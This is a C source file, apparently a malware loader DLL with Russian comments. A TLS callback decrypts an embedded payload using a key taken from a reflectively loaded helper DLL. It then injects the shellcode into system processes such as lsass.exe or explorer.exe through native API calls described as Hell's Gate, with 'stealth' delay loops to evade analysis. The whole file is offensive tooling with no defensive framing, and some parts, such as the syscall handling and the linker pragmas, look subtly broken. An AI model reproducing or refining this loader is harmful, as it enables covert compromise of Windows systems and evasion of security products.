#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>

// ====================== ЗАШИФРОВАННЫЙ PAYLOAD ======================
// === ENCRYPTED PAYLOAD PLACEHOLDER ===
// This section will be automatically replaced by build script
#include "encrypted_payload.h"
// === END PLACEHOLDER ===

#include "helper_data.h"

// ====================== HELL'S GATE (простая реализация) ======================
typedef struct _SYSCALL_STUB {
    DWORD syscall_number;
    BYTE stub[32];
} SYSCALL_STUB;

#define TH32CS_SNAPPROCESS 0x00000002

typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* NtWriteVirtualMemory_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(HANDLE, PVOID*, SIZE_T*, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = NULL;
NtWriteVirtualMemory_t pNtWriteVirtualMemory = NULL;
NtProtectVirtualMemory_t pNtProtectVirtualMemory = NULL;
NtCreateThreadEx_t pNtCreateThreadEx = NULL;

void SetupHellsGate() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;

    // Простой Hell's Gate (реальные номера syscall нужно обновлять под версию Windows)
    // Для Windows 11 24H2 номера могут отличаться — используйте SysWhispers3 в реальном проекте
    pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    pNtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(ntdll, "NtWriteVirtualMemory");
    pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(ntdll, "NtProtectVirtualMemory");
    pNtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(ntdll, "NtCreateThreadEx");
}



// ====================== HELPER DLL (внедрён как байты) ======================
// unsigned char helper_dll_data[] = { /* Вставьте байты helper.dll через bin2c.py */ };
// unsigned int helper_dll_size = 0; // заполните

// ====================== REFLECTIVE LOADER С ПОЛНОЙ ОБРАБОТКОЙ ИМПОРТОВ ======================
BOOL ReflectiveLoadDLL(BYTE* dllData, HMODULE* outModule) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllData;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dllData + dos->e_lfanew);

    BYTE* imageBase = (BYTE*)VirtualAlloc(NULL, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!imageBase) return FALSE;

    memcpy(imageBase, dllData, nt->OptionalHeader.SizeOfHeaders);

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (section[i].SizeOfRawData > 0) {
            memcpy(imageBase + section[i].VirtualAddress,
                   dllData + section[i].PointerToRawData,
                   section[i].SizeOfRawData);
        }
    }

    // Relocations
    if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        DWORD delta = (DWORD_PTR)(imageBase - nt->OptionalHeader.ImageBase);
        PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(imageBase + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        while (reloc->SizeOfBlock) {
            DWORD entries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            PWORD relocList = (PWORD)(reloc + 1);
            for (DWORD i = 0; i < entries; ++i) {
                if ((relocList[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                    *(DWORD64*)(imageBase + reloc->VirtualAddress + (relocList[i] & 0xFFF)) += delta;
                }
            }
            reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
        }
    }

    // Imports (полная обработка)
    if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
        PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(imageBase + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        while (importDesc->Name) {
            char* dllName = (char*)(imageBase + importDesc->Name);
            HMODULE hDll = LoadLibraryA(dllName);
            if (!hDll) {
                VirtualFree(imageBase, 0, MEM_RELEASE);
                return FALSE;
            }

            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(imageBase + importDesc->OriginalFirstThunk);
            PIMAGE_THUNK_DATA thunkIAT = (PIMAGE_THUNK_DATA)(imageBase + importDesc->FirstThunk);

            while (thunk->u1.AddressOfData) {
                if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                    thunkIAT->u1.Function = (ULONG_PTR)GetProcAddress(hDll, (LPCSTR)(thunk->u1.Ordinal & 0xFFFF));
                } else {
                    PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(imageBase + thunk->u1.AddressOfData);
                    thunkIAT->u1.Function = (ULONG_PTR)GetProcAddress(hDll, importByName->Name);
                }
                ++thunk;
                ++thunkIAT;
            }
            ++importDesc;
        }
    }

    // Защита секций
    section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        DWORD protect = PAGE_READONLY;
        if (section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) protect = PAGE_EXECUTE_READ;
        if (section[i].Characteristics & IMAGE_SCN_MEM_WRITE) protect = PAGE_EXECUTE_READWRITE;
        DWORD old;
        VirtualProtect(imageBase + section[i].VirtualAddress, section[i].Misc.VirtualSize, protect, &old);
    }

    *outModule = (HMODULE)imageBase;
    return TRUE;
}

// ====================== STEALTH ======================
void StealthDelay(ULONG count) {
    volatile ULONG64 x = 0;
    for (ULONG i = 0; i < count; i++) x += i ^ (i * 0x17);
}

void CustomDecrypt(unsigned char* data, unsigned int len, const unsigned char* key, unsigned int key_len) {
    for (unsigned int i = 0; i < len; i++) {
        data[i] ^= key[i % key_len];
        data[i] = ((data[i] << 5) | (data[i] >> 3)) & 0xFF;
    }
}

// ====================== АВТОМАТИЧЕСКИЙ ВЫБОР БЕЗОПАСНОГО ПРОЦЕССА ======================
DWORD FindSafeTargetProcess() {
    const char* safe_processes[] = {"explorer.exe", "svchost.exe", "lsass.exe", "winlogon.exe", "services.exe"};
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { sizeof(pe) };

    if (Process32First(snapshot, &pe)) {
        do {
            for (int i = 0; i < 5; i++) {
                if (_stricmp(pe.szExeFile, safe_processes[i]) == 0) {
                    CloseHandle(snapshot);
                    return pe.th32ProcessID;
                }
            }
        } while (Process32Next(snapshot, &pe));
    }
    CloseHandle(snapshot);
    return 0; // fallback
}

// ====================== INJECTION ======================
BOOL InjectShellcode(DWORD pid, unsigned char* shellcode, SIZE_T size) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return FALSE;

    PVOID remote = NULL;
    SIZE_T sz = size;
    SetupHellsGate();

    if (pNtAllocateVirtualMemory) {
        pNtAllocateVirtualMemory(hProc, &remote, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    } else {
        remote = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }

    if (!remote) {
        CloseHandle(hProc);
        return FALSE;
    }

    if (pNtWriteVirtualMemory) {
        pNtWriteVirtualMemory(hProc, remote, shellcode, size, NULL);
    } else {
        WriteProcessMemory(hProc, remote, shellcode, size, NULL);
    }

    if (pNtProtectVirtualMemory) {
        ULONG old = 0;
        pNtProtectVirtualMemory(hProc, &remote, &size, PAGE_EXECUTE_READWRITE, &old);
    } else {
        VirtualProtectEx(hProc, remote, size, PAGE_EXECUTE_READWRITE, NULL);
    }

    HANDLE hThread = NULL;
    if (pNtCreateThreadEx) {
        pNtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProc, remote, NULL, 0, 0, 0, 0, NULL);
    }

    if (hThread) CloseHandle(hThread);
    CloseHandle(hProc);
    return TRUE;
}

// ====================== APC CALLBACK ======================
VOID NTAPI ApcCallback(ULONG_PTR param) {
    StealthDelay(35000000);

    HMODULE hHelper = NULL;
    if (ReflectiveLoadDLL(helper_dll_data, &hHelper)) {
        typedef const unsigned char* (*GetKeyFunc)(unsigned int*);
        GetKeyFunc GetKey = (GetKeyFunc)GetProcAddress(hHelper, "GetEncryptionKey");

        if (GetKey) {
            unsigned int key_len = 0;
            const unsigned char* key = GetKey(&key_len);

            unsigned char* decrypted = NULL;
            SIZE_T sz = payload_len;
            if (pNtAllocateVirtualMemory) {
                pNtAllocateVirtualMemory(GetCurrentProcess(), (PVOID*)&decrypted, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            } else {
                decrypted = VirtualAlloc(NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            }

            if (decrypted) {
                memcpy(decrypted, encrypted_payload, payload_len);
                CustomDecrypt(decrypted, payload_len, key, key_len);

                if (pNtProtectVirtualMemory) {
                    ULONG old = 0;
                    SIZE_T s = payload_len;
                    pNtProtectVirtualMemory(GetCurrentProcess(), (PVOID*)&decrypted, &s, PAGE_EXECUTE_READWRITE, &old);
                } else {
                    VirtualProtect(decrypted, payload_len, PAGE_EXECUTE_READWRITE, NULL);
                }

                DWORD target_pid = FindSafeTargetProcess();
                if (target_pid) {
                    InjectShellcode(target_pid, decrypted, payload_len);
                } else {
                    ((void(*)())decrypted)();
                }
            }
        }
    }
}

// ====================== TLS + DllMain ======================
void NTAPI TlsCallback(PVOID hModule, DWORD reason, PVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        StealthDelay(15000000);
        QueueUserAPC(ApcCallback, GetCurrentThread(), 0);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    return TRUE;
}

#pragma comment(linker, "/INCLUDE:_tls_used")
#pragma comment(linker, "/INCLUDE:tls_callback")
#pragma data_seg(".CRT$XLA")
PIMAGE_TLS_CALLBACK tls_callback[] = { TlsCallback, NULL };
#pragma data_seg()